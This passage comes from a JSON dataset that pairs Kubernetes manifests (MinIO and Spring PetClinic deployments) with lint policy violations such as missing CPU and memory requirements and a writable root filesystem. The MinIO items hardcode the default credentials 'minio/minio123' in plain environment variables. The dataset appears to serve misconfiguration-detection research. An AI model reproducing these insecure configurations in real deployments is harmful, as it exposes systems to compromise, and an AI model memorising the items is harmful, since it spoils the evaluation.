    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-04-04T05-39-31Z\n        args:\n        - server\n        - http://minio-{0...3}.minio.default.svc.cluster.local/data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"minio\" has cpu request 0"
  },
  {
    "id": "03479",
    "manifest_path": "data/manifests/the_stack_sample/sample_1519.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: minio\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      containers:\n      - name: minio\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        image: minio/minio:RELEASE.2020-04-04T05-39-31Z\n        args:\n        - server\n        - http://minio-{0...3}.minio.default.svc.cluster.local/data\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: data\n          mountPath: /data\n        livenessProbe:\n          httpGet:\n            path: /minio/health/live\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n        readinessProbe:\n          httpGet:\n            path: /minio/health/ready\n            port: 9000\n          initialDelaySeconds: 120\n          periodSeconds: 20\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"minio\" has memory limit 0"
  },
  {
    "id": "03480",
    "manifest_path": "data/manifests/the_stack_sample/sample_1520.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: spring-petclinic-scott\n  name: spring-petclinic-scott-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: spring-petclinic-scott\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: spring-petclinic-scott\n        app.kubernetes.io/part-of: spring-petclinic-scott\n        tanzu.app.live.view: 'true'\n        tanzu.app.live.view.application.name: spring-petclinic-scott\n    spec:\n      containers:\n      - image: spring-petclinic-scott:2.4.2\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 15\n        name: app\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 15\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  }
]